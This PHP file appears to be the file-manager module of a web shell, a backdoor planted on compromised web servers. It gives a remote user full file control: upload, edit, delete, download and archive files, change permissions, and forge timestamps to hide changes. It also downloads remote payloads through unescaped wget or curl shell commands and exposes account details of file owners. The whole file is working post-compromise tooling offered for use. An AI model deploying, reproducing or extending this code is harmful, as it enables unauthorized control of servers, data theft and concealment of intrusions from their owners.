<?php
    define('SROOT', dirname(__file__) . DS);
    $shelldir = getPath(SROOT, '.');

    function dirsize($dir){
        $f = $s = 0;
        $dh = @opendir($dir);
        while (false !== ($file = @readdir($dh))){
            if ($file === '.' || $file === '..')
                continue;
            
            $path = $dir . DS . $file;
            if (is_dir($path)){
                $tmp = dirsize($path); 
                $f += $tmp['f'];  
                $s += $tmp['s'];  
            } else {
                $f++;
                $s += @filesize($path);
            }
        }
        @closedir($dh);
        return array ('f' => $f, 's' => $s);
    }

    function getChmod($filepath){
        return substr(base_convert(@fileperms($filepath), 10, 8), -4);
    }

    function getPerms($filepath){
        $mode = @fileperms($filepath);
        if (!$mode) {
            return '???????????';
        }

        if (($mode & 0xC000) === 0xC000) $type = 's';      // Socket
        else if (($mode & 0x4000) === 0x4000) $type = 'd'; // Directory
        else if (($mode & 0xA000) === 0xA000) $type = 'l'; // Symbolic Link
        else if (($mode & 0x8000) === 0x8000) $type = '-'; // Regular 
        else if (($mode & 0x6000) === 0x6000) $type = 'b'; // Block special
        else if (($mode & 0x2000) === 0x2000) $type = 'c'; // Character special
        else if (($mode & 0x1000) === 0x1000) $type = 'p';// FIFO pipe
        else $type = 'u';                                  // Unknown

        $o['r'] = ($mode & 00400) ? 'r' : '-'; 
        $o['w'] = ($mode & 00200) ? 'w' : '-'; 
        $o['e'] = ($mode & 00100) ? 'x' : '-'; 
        $g['r'] = ($mode & 00040) ? 'r' : '-'; 
        $g['w'] = ($mode & 00020) ? 'w' : '-'; 
        $g['e'] = ($mode & 00010) ? 'x' : '-'; 
        $w['r'] = ($mode & 00004) ? 'r' : '-'; 
        $w['w'] = ($mode & 00002) ? 'w' : '-'; 
        $w['e'] = ($mode & 00001) ? 'x' : '-'; 

        if ($mode & 0x800) $o['e'] = ($o['e']==='x') ? 's' : 'S';
        if ($mode & 0x400) $g['e'] = ($g['e']==='x') ? 's' : 'S';
        if ($mode & 0x200) $w['e'] = ($w['e']==='x') ? 't' : 'T';
        
        return $type.$o['r'].$o['w'].$o['e'].$g['r'].$g['w'].$g['e'].$w['r'].$w['w'].$w['e'];
    }

    function getUser($filepath){
        if (function_exists('posix_getpwuid')){
            $array = @posix_getpwuid(@fileowner($filepath));
            if ($array && is_array($array))
                return mLink($array['name'], 'return false;', "title='User: {$array['name']} Passwd: {$array['passwd']} " .
                    "UID: {$array['uid']}   GID: {$array['gid']} Gecos: {$array['gecos']} Dir: {$array['dir']} " .
                    "Shell: {$array['shell']}'", false);
        }
        return '';
    }
    
    function vPermsColor($t){ 
        $c = 'mg';
        if (!is_readable($t))
            $c = 'mr';
        else if (!is_writable($t))
            $c = 'mw';
        return "<font class='$c'>" . getChmod($t) . '&nbsp;' . getPerms($t) . "</font>";
    }

    function delTree($path){
        $origipath = $path;
        $h = opendir($path);
        while (true){
            $item = readdir($h);
            if ($item === '.' or $item === '..')
                continue;

            if (gettype($item) === 'boolean'){
                closedir($h);
                if (!@rmdir($path))
                    return false;
                
                if ($path == $origipath) 
                    break;
                
                $path = substr($path, 0, strrpos($path, DS));
                $h = opendir($path);
            } else if (is_dir($path . DS . $item)){
                closedir($h);
                $path = $path . DS . $item;
                $h = opendir($path);
            } else 
                unlink($path . DS . $item);
        }
        return true;
    }
        
    function recursiveCopy($path, $dest){ 
        if (is_dir($path)){
            @mkdir($dest);
            $objects = scandir($path);
            if (sizeof($objects) > 0){
                foreach($objects as $file){
                    if ($file !== '.' && $file !== '..'){
                        if (is_dir($path.$file))
                            recursiveCopy($path . $file . DS, $dest . DS . $file . DS);
                        else 
                            copy($path . $file, $dest . $file);
                    }
                }
            }
            return true;
        } else if(is_file($path)){
            return copy($path, $dest);
        } else {
            return false;
        } 
    }
    
    function getext($file){
        //$info = pathinfo($file);
        return pathinfo($file, PATHINFO_EXTENSION);
    }
    
    function checkFile($t, $w, $f){
        $ret = true;
        if ($w)
            $ret = $ret && is_writable($t);
            
        /*if ($f){
            if ($re)
                $ret = $ret && (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_contents($f)))
            else 
                $ret = $ret && (strstr($file, $sBuff) || strstr(@file_get_contents($f), $sBuff))
        }
            
        if ($extFilter)
            $ret = $ret && (in_array(getext($f), explode(',', $extFilter)));
        */
            
        return $ret;
    }
    
    function download($url, $save){
        global $isWIN;

        if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
        if(is_file($save)) unlink($save);
        if($sBuff = file_get_contents($url)){
            if(file_put_contents($save, $sBuff))
                return true;
        }
        
        if (!$isWIN){
            $buff = execute('wget '.$url.' -O '.$save);
            if(is_file($save)) return true;
            $buff = execute('curl '.$url.' -o '.$save);
            if(is_file($save)) return true;
            $buff = execute('lwp-download '.$url.' '.$save);
            if(is_file($save)) return true;
            $buff = execute('lynx -source '.$url.' > '.$save);
            if(is_file($save)) return true;
        }

        return false;
    }
    
    function fileList($typ, $dir, $limit, $page, $onlyW = false, $find = false, $rec = false, $count = 0){
        global $fDataD, $fDataF;
        $sFolder = $sFile = $show = true;
        if ($limit){
            $show = false;
            if (!isset($page))
                $page = 1;
            
            $start = $limit * ($page - 1);
            $limit = $limit * $page;
        }
        
        if ($typ === 'dir')
            $sFile = false;
        else if ($typ === 'file')
            $sFolder = false;
            
        if ($res = opendir($dir)){
            while ($file = readdir($res)){
                if ($limit) {
                    if ($count == $start) 
                        $show = true;
                        
                    if ($count == $limit) 
                        break;  
                }

                if ($file !== '.' && $file !== '..' && is_dir($dir . $file)){                       
                    if ($rec)
                        //yield fileList($typ, $dir . $file, $limit, $page, $find, $rec, $count);
                        fileList($typ, $dir . $file, $limit, $page, $find, $rec, $count);
                    else if ($show && $sFolder && checkFile($dir . $file, $onlyW, $find))
                        //yield array('t'=>'d', 'n'=>$file);
                        $fDataD[] = $file;
                        
                    $count++;
                } else if (is_file($dir . $file) && $sFile){
                    if ($show && checkFile($dir . $file, $onlyW, $find))
                        //yield array('t'=>'f', 'n'=>$file);
                        $fDataF[] = $file;
                        
                    $count++;
                } //TODO syslinks 
            }
            
            closedir($res);
            @clearstatcache();
        }
    }


    // comienzo
    if (@$p['md'] === 'vs'){
        $s = dirsize($p['f']);
        sAjax(is_numeric($s['s']) ? sizecount($s['s']) . ' (' . $s['f'] . ')' : 'Error?');
    } else if (@$p['md'] === 'tools'){
        switch ($p['ac']){
            case 'cdir':
                if (file_exists($p['a'] . $p['b']))
                    sAjax(tText('alredyexists', 'object alredy exists'));
                
                @mkdir($p['a'] . $p['b'], 0777);
                @chmod($p['a'] . $p['b'], 0777);
                if (file_exists($p['a'] . $p['b']))
                    sAjax('OK');

                sAjax(tText('fail', 'Fail!'));
                break;
            case 'cfile':
                if (file_exists($p['a'] . $p['b']))
                    sAjax(tText('alredyexists', 'object alredy exists'));

                if (false !== file_put_contents($p['a'] . $p['b'], '')) 
                    sAjax('OK');

                sAjax(tText('accessdenied', 'Access denied'));
                break;
            case 'comp':
                if ($p['dl']){
                    $zip = new PHPZip();
                    $zip->Zipper($p['fl'], $p['dl']);
                    header('Content-Type: application/octet-stream');
                    header('Accept-Ranges: bytes');
                    header('Accept-Length: ' . strlen($compress));
                    header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
                    echo $zip->file();
                    exit;
                }
                break;
            case 'uncomp':
                if ($p['dl']){
                    $types['zip'] = 'zip';
                    $types['tar'] = 'tar';
                    $types['tar.gz'] = 'targz';
                    $types['tgz'] = 'targz';

                    $fNames = array();
                    foreach($p['dl'] as $value){
                        $ext = pathinfo($value);
                        if (isset($types[ $ext['extension'] ]))
                            if (decompress($types[ $ext['extension'] ], $p['fl'] . $value, $p['fl']))
                                $fNames[] = $value;
                    }

                    sAjax(tText('pfm', 'Process files:') . implode(', ', $fNames) . ' (' . count($fNames) . ')');
                }           
                break;
            case 'reup':
                if (download($p['b'], $p['a'] . basename($p['b']))) 
                    sAjax('OK');

                sAjax(tText('fail', 'Fail'));
                break;
            case 'copy': 
                if ($p['dl']){
                    $fNames = Array();
                    $total = count($p['dl']);
                    if ($p['b'][(strlen($p['b']) - 1)] !== DS) $p['b'] .= DS; 
                    for ($z = 0; $total > $z; $z++){
                        $fileinfo = pathinfo($p['fl'] . $p['dl'][$z]);
                        if (!file_exists($p['fl'] . $p['dl'][$z]))
                            sAjax(tText('notexist', 'Object does not exist'));
                        
                        if (is_dir($p['fl'] . $p['dl'][$z])){ 
                            if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
                        } else {
                            if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
                        }
                    }

                    sAjax(hsc(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']'));
                }
                break;
            case 'del':
                if (!file_exists($p['a']))
                    sAjax(tText('notexist', 'Object does not exist'));
                
                sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));    
                break;
            case 'rdel':
                if ($p['dl']){
                    $fNames = Array();
                    $total = count($p['dl']);               
                    for ($z = 0; $total > $z; $z++){
                        if (is_dir($p['fl'] . $p['dl'][$z])){
                            if (!@delTree($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
                        } else {
                            if (!@unlink($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
                        }
                    }
                    sAjax(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']');
                }
                break;
            case 'dl':
                if (!file_exists($p['fl']))
                    sAjax(tText('notexist', 'Object does not exist'));
                
                $fileinfo = pathinfo($p['fl']);
                header('Content-Type: application/x-' . $fileinfo['extension']);
                header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
                header('Content-Length: ' . filesize($p['fl']));
                readfile($p['fl']);
                exit;
                break;
            case 'edit':
                if (file_put_contents($p['a'], $p['fc']))
                    sAjax(tText('ok', 'Ok!'));

                tText('fail', 'Fail!');
                break;
            case 'mdate':
                if (!@file_exists($p['a']))
                    sAjax(tText('notexist', 'Object does not exist'));
                
                if (isset($p['b'])) $time = strtotime($p['b']);
                else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['i'] . ':' . $p['s']);
                sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
                break;
            case 'mdatec':
                if (!@file_exists($p['a']) || !@file_exists($p['b'])) 
                    sAjax(tText('notexist', 'Object does not exist'));
                
                $time = @filemtime($p['b']);
                sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
                break;              
            case 'mpers':
                if (!file_exists($p['a']))
                    sAjax(tText('notexist', 'Object does not exist'));
                
                sAjax(@chmod($p['a'], base_convert($p['b'], 8, 10)) ? 'OK' : tText('fail', 'Fail!'));
                break;  
            case 'ren':
                if (!file_exists($p['a']))
                    sAjax(tText('notexist', 'Object does not exist'));
                
                sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
                break;
        }
    } else if (@$p['md'] === 'info'){
        if (file_exists($p['t'])){
            $sBuff .= '<h2>' . tText('information', 'Information') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=filemanager&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
                     <table border=0 cellspacing=1 cellpadding=2>
                     <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . hsc($p['t']) . '</td></tr>
                     <tr><td><b>' . tText('size', 'Size') . '</b></td><td>' . sizecount(filesize($p['t'])) . '</td></tr>
                     <tr><td><b>' . tText('md5', 'MD5') . '</b></td><td>' . strtoupper(@md5_file($p['t'])) . '</td></tr>
                     <tr><td><b>' . tText('sha1', 'SHA1') . '</b></td><td>' . strtoupper(@sha1_file($p['t'])) . '</td></tr>
                     <tr><td><b>' . tText('ctime', 'Create time') . '</b></td><td>' . date($config['datetime'], filectime($p['t'])) . '</td></tr>
                     <tr><td><b>' . tText('atime', 'Access time') . '</b></td><td>' . date($config['datetime'], fileatime($p['t'])) . '</td></tr>
                     <tr><td><b>' . tText('mtime', 'Modify time') . '</b></td><td>' . date($config['datetime'], filemtime($p['t'])) . '</td></tr>';
                         
            if (!$isWIN){
                $ow = posix_getpwuid(fileowner($p['t']));
                $gr = posix_getgrgid(filegroup($p['t']));
                $sBuff .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
                            ($ow['name'] ? $ow['name'] : fileowner($p['t'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($p['t'])) .
                            '<tr><td><b>' . tText('perms', 'Perms') . '</b></td><td>' . vPermsColor($p['t']) . '</td></tr>';
            }
            $sBuff .= '</table><br>';
                    
            $fp  = @fopen($p['t'], 'rb');
            if ($fp){
                $sBuff .= '<div data-path="' . $p['t'] . '"><p>
                                [' . mLink(tText('hl', 'Highlight'), 'ajaxLoad("me=filemanager&md=info&hl=n&t=" + euc(dpath(this, false)))') . ']
                                [' . mLink(tText('hlp', 'Highlight +'), 'ajaxLoad("me=filemanager&md=info&hl=p&t=" + euc(dpath(this, false)))') . ']
                                [' . mLink(tText('hd', 'Hexdump'), 'ajaxLoad("me=filemanager&md=info&hd=n&t=" + euc(dpath(this, false)))') . ']
                                [' . mLink(tText('hdp', 'Hexdump preview'), 'ajaxLoad("me=filemanager&md=info&hd=p&t=" + euc(dpath(this, false)))') . ']
                                [' . mLink(tText('edit', 'Edit'), 'ajaxLoad("me=filemanager&md=edit&t=" + euc(dpath(this, false)))') . ']
                            </p></div><br><br>';        
                
                if (isset($p['hd'])){
                    if ($p['hd'] === 'n'){
                        $sBuff .= '<b>Hex Dump</b><br>';
                        $str = fread($fp, filesize($p['t']));
                    } else {
                        $sBuff .= '<b>Hex Dump Preview</b><br>';
                        $str = fread($fp, $config['hd_lines'] * $config['hd_rows']);
                    }
                    
                    $show_offset  = '00000000<br>';
                    $show_hex     = '';
                    $show_sBuff = '';
                    $counter      = 0;
                    $str_len      = strlen($str);
                    for ($i = 0; $i < $str_len; $i++){
                        $counter++;
                        $show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
                        switch (ord($str[$i])){
                            case 0 :
                            case 9 :
                            case 10:
                            case 13:
                            case 32: $show_sBuff .= ' '; 
                                break;
                            default: $show_sBuff .= $str[$i];
                        }
                        if ($counter === $config['hd_rows']){
                            $counter = 0;
                            if ($i + 1 < $str_len) 
                                $show_offset .= sprintf('%08X', $i + 1) . '<br>';
                            $show_hex .= '<br>';
                            $show_sBuff .= "\n";
                        }
                    }
                    $sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . hsc($show_sBuff) . '</pre></td></tr></table></center><br>';
                } else if (isset($p['hl'])){
                    if (function_exists('highlight_file')){
                        if ($p['hl'] === 'n'){
                            $sBuff .= '<b>Highlight:</b><br>' .
                                        '<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
                        } else {
                            $code = substr(highlight_file($p['t'], true), 36, -15);
                            //if (substr_count($code, '<br>') > substr_count($code, "\n"))
                            $lines = explode('<br />', $code);
                            $pl = strlen(count($lines));
                            $sBuff .= '<b>Highlight +:</b><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
                            
                            foreach($lines as $i => $line){
                                $sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', str_pad($i + 1,  $pl, '0', STR_PAD_LEFT), $line);
                            }

                            $sBuff .= '</div>';
                        }
                    } else
                        $sBuff .= sDialog(tText('hlerror', 'highlight_file() dont exist!'));
                } else {
                    $str = @fread($fp, filesize($p['t']));
                    $sBuff .= '<b>File:</b><br>' .
                                '<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
                }
            }
        } else
            $sBuff .= sDialog(tText('accessdenied', 'Access denied'));
        
        @fclose($fp);
    } else if (@$p['md'] === 'edit'){
        if (file_exists($p['t'])){
            $filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
            $sBuff .= '<h2>' . tText('edit', 'Edit') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=filemanager&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
                    <div class="alt1 stdui"><form name="cldate">
                        ' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdatec') . '
                        <h3>' . tText('e1', 'Clone folder/file last modified time') . '</h3>
                        ' . mInput('a', $p['t'], tText('e2', 'Alter folder/file'), 1, '', 'style="width: 99%;" disabled') . '
                        ' . mInput('b', '', tText('e3', 'Reference folder/file (fullpath)'), 1, '', 'style="width: 99%;"') . '
                        ' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)') . '
                    </form></div><br><br>
                    <div class="alt1 stdui"><form name="chdate">
                        ' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdate') . '
                        <h3>' . tText('e4', 'Set last modified time') . '</h3>
                        ' . mInput('a', $p['t'], tText('e5', 'Current folder/file (fullpath)'), 1, '', 'style="width: 99%;" disabled') . '
                        <p>
                            ' . tText('year', 'year') . ': ' . mInput('y', $filemtime[0], '', '', '', 'size="4"') . '
                            ' . tText('month', 'month') . ': ' . mInput('m', $filemtime[1], '', '', '', 'size="2"') . '
                            ' . tText('day', 'day') . ': ' . mInput('d', $filemtime[2], '', '', '', 'size="2"') . '
                            ' . tText('hour', 'hour') . ': ' . mInput('h', $filemtime[3], '', '', '', 'size="2"') . '
                            ' . tText('minute', 'minute') . ': ' . mInput('i', $filemtime[4], '', '', '', 'size="2"') . '
                            ' . tText('second', 'second') . ': ' . mInput('s', $filemtime[5], '', '', '', 'size="2"') . '
                        </p>
                        ' . mSubmit(tText('go', 'Go!'), 'uiupdate(1)') . '
                    </form></div><br><br>';
                    
            $fp = @fopen($p['t'], 'r');
            if ($fp) {
                $sBuff .= '<div class="alt1 stdui"><form data-path="' . $p['t'] . '">
                                ' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'edit') . mHide('a', $p['t']) . '
                                <h3>' . tText('e5', 'Edit file') . '</h3>
                                <p>
                                    [' . mLink(tText('hl', 'Highlight'), 'ajaxLoad("me=filemanager&md=info&hl=n&t=" + euc(dpath(this, false)))') . ']
                                    [' . mLink(tText('hlp', 'Highlight +'), 'ajaxLoad("me=filemanager&md=info&hl=p&t=" + euc(dpath(this, false)))') . ']
                                    [' . mLink(tText('hd', 'Hexdump'), 'ajaxLoad("me=filemanager&md=info&hd=n&t=" + euc(dpath(this, false)))') . ']
                                    [' . mLink(tText('hdp', 'Hexdump preview'), 'ajaxLoad("me=filemanager&md=info&hd=p&t=" + euc(dpath(this, false)))') . ']
                                </p><br>
                                <textarea name="fc" cols="100" rows="25" style="width: 99%;">' . hsc(@fread($fp, filesize($p['t']))) . '</textarea>
                                ' . mSubmit(tText('go', 'Go!'), 'uiupdate(2)') . '
                            </form></div><br><br>';
            }
            @fclose($fp);
        }
    } else {
        if (isset($p['ac']) && $p['ac'] === 'up')
            $sBuff .= sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
                
        $currentdir = $shelldir;
        if (!empty($p['dir'])){
            $p['dir'] = fixRoute($p['dir']);
            if (substr($p['dir'], -1) !== DS) $p['dir'] = $p['dir'] . DS;
            $currentdir = $p['dir'];
        }

        $sBuff .= '<form name="fmg"><table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';

        $free = @disk_free_space($currentdir);
        $all = @disk_total_space($currentdir);
        if ($free) $sBuff .= '<h2>' . tText('freespace', 'Free space') . ' ' . sizecount($free) . ' ' . tText('of', 'of') . ' ' . sizecount($all) . ' (' . round(100 / ($all / $free), 2) . '%)</h2>';
        
        $fp = '';
        $lnks = ''; 
        foreach (explode(DS, $currentdir) as $tmp){
            if (!empty($tmp) || empty($fp)){
                $fp .= $tmp . DS;
                $lnks .= mLink($tmp . DS, 'godisk(this)', "data-path='{$fp}'") . ' ';
            }
        }
        unset($fp, $tmp);

        $sBuff .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
              <tr>
                <td nowrap>' . tText('acdir', 'Current directory') . ' [' . (@is_writable($currentdir) ? tText('writable', 'Writable') : tText('no', 'No') . ' ' . tText('writable', 'Writable')) . ($isWIN ? '' : ', ' . getChmod($currentdir)) . ']: </td>
                <td width="100%"><span id="sgoui" class="hide"><div class="image dir" onclick="change(\'sgoui\', \'lnks\')"></div>&nbsp;
                &nbsp;' . mInput('goui', $currentdir, '', '', '', 'size="100%"') . '
                &nbsp;' . mSubmit(tText('go', 'Go!'), 'godirui()', '', 'style="width: 5px;display: inline;"') . '</span><span id="lnks"><div class="image edit" onclick="change(\'lnks\', \'sgoui\')"></div>&nbsp;'. $lnks .'</span></td>
              </tr>
            </table>        
            <tr class="alt1"><td colspan="7" style="padding:5px;">';

        if ($isWIN){
            $sBuff .= tText('drive', 'Drive') . ': ';
            if (class_exists('COM')){
                $obj = new COM('scripting.filesystemobject');
                if ($obj && is_object($obj)){
                    $DriveTypeDB = array(0 => tText('unknow', 'Unknow'),
                        1 => tText('removable', 'Removable'),
                        2 => tText('fixed', 'Fixed'),
                        3 => tText('network', 'Network'),
                        4 => tText('cdrom', 'CDRom'),
                        5 => tText('ramdisk', 'RAM Disk'));
                        
                    foreach ($obj->Drives as $drive){
                        $sBuff .= ' [<a href="#" data-path="' . $drive->Path . '/\'" onclick=';
                        if ($drive->DriveType == 2) 
                            $sBuff .= '"godisk(this);return false;" title="' . tText('size', 'Size') . ':' . sizecount($drive->TotalSize) . ' ' . tText('free', 'Free') . ':' . sizecount($drive->FreeSpace) . ' ' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
                        else 
                            $sBuff .= '"if (confirm(\'' . tText('derror', 'Make sure that disk is avarible, otherwise an error may occur.') . '\')) godisk(this);return false;" title="' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
                    }
                }
            } else {
                foreach (range('A', 'Z') as $letter)
                    if (@is_readable("{$letter}:\\")) 
                        $sBuff .= ' [' . mLink("{$letter}:", 'godisk(this)', "data-path='{$letter}:\\'") . '] ';
            }
            $sBuff .= '<br>';
        }

        $sBuff .= tText('fmso', 'Show only') . ': <b>' . (isset($p['fm_mode']) ? $p['fm_mode'] : tText('all', 'All')) . '</b> ' .
            tText('fmow', 'Only writable') . ': <b>' . (isset($p['fm_onlyW']) ? tText('yes', 'yes') : tText('no', 'no')) . '</b> ' .
            tText('fmrl', 'Recursive listing') . ': <b>' . (isset($p['fm_rec']) ? tText('yes', 'yes') : tText('no', 'no')) . '</b><br>' .
            mLink(tText('webroot', 'WebRoot'), 'godisk(this)', "data-path='{$_SERVER['DOCUMENT_ROOT']}'") . ' | ' .
            mLink(tText('createdir', 'Create directory'), 'showUI("cdir", this)') . ' | ' .
            mLink(tText('createfile', 'Create file'), 'showUI("cfile", this)') . ' | ' .
            mLink(tText('upload', 'Upload'), 'up()') . ' | ' .
            mLink(tText('showfmextras', 'Show extra tools'), 'showFMExtras()') . '<br></td></tr></table><br>';

        if (is_dir($currentdir)){
            $bg = 2;
            $c = $d = 0;
            $drf = fixRoute($_SERVER['DOCUMENT_ROOT']);
            $baseURL = str_replace(DS, '/', str_replace($drf, '', $currentdir));
            $isLinked = strncasecmp($drf, $currentdir, strlen($_SERVER['DOCUMENT_ROOT'])) === 0 ? true : false;
        
            $sBuff .= '<table id="sort" class="explore sortable">
                <thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
                <td class="alt1 sorttable_nosort" width="5px">' . mLink('<div class="image lnk"></div>', 'godir(this, false)') . '</td>
                <td class="touch" width="60%"><b>' . tText('name', 'Name') . '</b></td>
                <td class="touch"><b>' . tText('date', 'Date') . '</b></td>
                <td class="touch"><b>' . tText('size', 'Size') . '</b></td>
                ' . (! $isWIN ? '<td class="touch"><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
                <td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
                </tr></thead>
                <tbody>';
            
            $fDataD = $fDataF = array();
            fileList($p['fm_mode'], $currentdir, $config['FMLimit'], $p['pg'], isset($p['fm_onlyW']), $p['fm_find'], isset($p['fm_rec']));
            
            @natcasesort($fDataD);
            foreach ($fDataD as $file){
                    $d++;
                $ft = filemtime($currentdir . $file);
                $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
                    <td><input type="checkbox" value="' . $file . DS . '" name="dl[]"></td>
                    <td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
                        <td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
                        <td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
                    ' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a><br>' . getUser($currentdir . $file) . '</td>' : '') . '
                        <td>
                        <div onclick="showUI(\'del\', this);return false;" class="image del"></div>
                        <div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
                        <div onclick="ajaxLoad(\'me=filemanager&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
                        <div onclick="ajaxLoad(\'me=filemanager&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
                        </td>
                        </tr>';
            }
            unset($fDataD);
            
            @natcasesort($fDataF);
            foreach ($fDataF as $file){
                    $c++;
                $ft = filemtime($currentdir . $file);
                $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
                    <td><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';

                if ($currentdir . $file === __file__) $sBuff .= '<div class="image php"></div><font class="my">' . $file . '</font>';
                else if($isLinked) $sBuff .= showIcon($file) . ' <a href="' . $baseURL . $file . '" target="_blank">' . $file . '</a>';
                else $sBuff .= showIcon($file) . ' ' . $file;
                       
                $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
                    <td>' . sizecount(filesize64($currentdir . $file)) . '</td>
                    ' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a><br>' . getUser($currentdir . $file) . '</td>' : '') . '
                        <td>
                        <div onclick="showUI(\'del\', this);return false;" class="image del"></div>
                        <div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
                        <div onclick="ajaxLoad(\'me=filemanager&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
                        <div onclick="ajaxLoad(\'me=filemanager&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
                        <div onclick="dl(this);return false;" class="image download"></div>
                        </td></tr>';
                }
            unset($fDataF);
            
            $sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
                <td width="2%">' . mCheck('chkall', '', 'CheckAll(this.form);') . '</td>
                <td>' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp")') . ' | ' . 
                mLink(tText('del', 'Del'), 'showUISec("rdel")') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy")') . ' | ' . mLink(tText('uncompress', 'Uncompress'), 'showUISec("uncomp")') . '</td>
                <td colspan="4" align="right">
                <b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . $c . '</b> ' . tText('fils', 'Files') . '
                </td>
                </tr></tfoot>
                </table></form>' . mHide('base', $currentdir);
        } else
            $sBuff .= sDialog(tText('accessdenied', 'Access denied'));
        
        if ($config['FMLimit'])
            $sBuff .= genPaginator($p['pg'], ($c < $config['FMLimit'] ? $p['pg'] : -1));
    }